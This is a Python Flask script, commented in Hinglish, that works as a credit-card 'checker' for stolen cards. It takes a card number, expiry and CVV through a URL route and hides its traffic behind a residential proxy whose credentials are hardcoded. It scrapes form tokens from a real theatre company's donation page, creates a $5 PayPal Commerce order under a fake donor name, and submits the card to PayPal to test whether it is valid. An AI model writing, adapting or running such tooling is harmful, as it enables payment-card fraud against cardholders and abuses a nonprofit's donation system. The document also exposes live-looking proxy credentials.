import requests
import base64
import re
import random
from flask import Flask, request, jsonify

app = Flask(__name__)

# SIRF YAHAN CHANGE KARO - PURANA PROXY HATAKE YE DALO
PROXY_LIST = [
    {'http': 'http://Quantum-wn20la7vz1eG1l1l2:vb0ifitn@new.quantumproxies.net:10000', 'https': 'http://Quantum-wn20la7vz1eG1l1l2:vb0ifitn@new.quantumproxies.net:10000'}
]

def get_random_proxy():
    return random.choice(PROXY_LIST) if PROXY_LIST else None

@app.route('/cc=<cc>|<mm>|<yy>|<cvv>', methods=['GET'])
def check_card(cc, mm, yy, cvv):
    session = requests.session()
    
    # Random proxy select karo
    proxy = get_random_proxy()
    print(f"Using proxy: Quantum Residential Proxy")

    try:
        # Step 1: Get donation page with proxy
        headers = {
            'authority': 'atlanticcitytheatrecompany.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 15; V2312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
        }

        response = session.get('https://atlanticcitytheatrecompany.com/donations/donate/', headers=headers, proxies=proxy, timeout=30)

        # Extract required data
        prefix_match = re.search(r'give-form-id-prefix" value="([^"]+)"', response.text)
        if prefix_match:
            prefix = prefix_match.group(1)

        id_match = re.search(r'give-form-id" value="([^"]+)"', response.text)
        if id_match:
            id = id_match.group(1)

        hash_match = re.search(r'give-form-hash" value="([^"]+)"', response.text)
        if hash_match:
            hash = hash_match.group(1)

        enc_token_match = re.search(r"data-client-token\":\"(.*?)\"", response.text)
        if enc_token_match:
            enc = enc_token_match.group(1)

        dec = base64.b64decode(enc).decode('utf-8')
        
        acc_match = re.search(r"accessToken\":\"(.*?)\"", dec)
        if acc_match:
            acc = acc_match.group(1)

        # Step 2: Create order with proxy
        headers = {
            'authority': 'atlanticcitytheatrecompany.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryrkHdX8VpEbOzBP7v',
            'origin': 'https://atlanticcitytheatrecompany.com',
            'referer': 'https://atlanticcitytheatrecompany.com/donations/donate/',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 15; V2312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
        }

        params = {
            'action': 'give_paypal_commerce_create_order',
        }

        files = {
            'give-honeypot': (None, ''),
            'give-form-id-prefix': (None, '455-1'),
            'give-form-id': (None, id),
            'give-form-title': (None, ''),
            'give-current-url': (None, 'https://atlanticcitytheatrecompany.com/donations/donate/'),
            'give-form-url': (None, 'https://atlanticcitytheatrecompany.com/donations/donate/'),
            'give-form-minimum': (None, '5.00'),
            'give-form-maximum': (None, '999999.99'),
            'give-form-hash': (None, hash),
            'give-price-id': (None, 'custom'),
            'give-amount': (None, '5.00'),
            'give_stripe_payment_method': (None, ''),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, 'Assassin '),
            'give_last': (None, 'Op'),
            'give_email': (None, 'assassinopbolte@gmail.com'),
            'give_comment': (None, ''),
            'card_name': (None, 'Assassin '),
            'card_exp_month': (None, ''),
            'card_exp_year': (None, ''),
            'billing_country': (None, 'US'),
            'card_address': (None, 'Ny'),
            'card_address_2': (None, ''),
            'card_city': (None, 'New york '),
            'card_state': (None, 'NY'),
            'card_zip': (None, '10080'),
            'give_agree_to_terms': (None, '1'),
            'give-gateway': (None, 'paypal-commerce'),
        }

        response = session.post(
            'https://atlanticcitytheatrecompany.com/wp-admin/admin-ajax.php',
            params=params,
            headers=headers,
            files=files,
            proxies=proxy,
            timeout=30
        )

        # Step 3: Confirm payment with proxy
        headers = {
            'authority': 'cors.api.paypal.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'authorization': f'Bearer {acc}',
            'braintree-sdk-version': '3.32.0-payments-sdk-dev',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'paypal-client-metadata-id': 'bb55c14f11aba72aaeb78ce1c2fab885',
            'referer': 'https://assets.braintreegateway.com/',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 15; V2312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
        }

        json_data = {
            'payment_source': {
                'card': {
                    'number': cc,
                    'expiry': f'20{yy}-{mm}',
                    'security_code': cvv,
                    'attributes': {
                        'verification': {
                            'method': 'SCA_WHEN_REQUIRED',
                        },
                    },
                },
            },
            'application_context': {
                'vault': False,
            },
        }

        response = session.post(
            'https://cors.api.paypal.com/v2/checkout/orders/8B515934GC0616145/confirm-payment-source',
            headers=headers,
            json=json_data,
            proxies=proxy,
            timeout=30
        )

        return jsonify(response.json())

    except Exception as e:
        return jsonify({'error': f'Proxy/Request failed: {str(e)}'})

if __name__ == '__main__':
    app.run(debug=True)
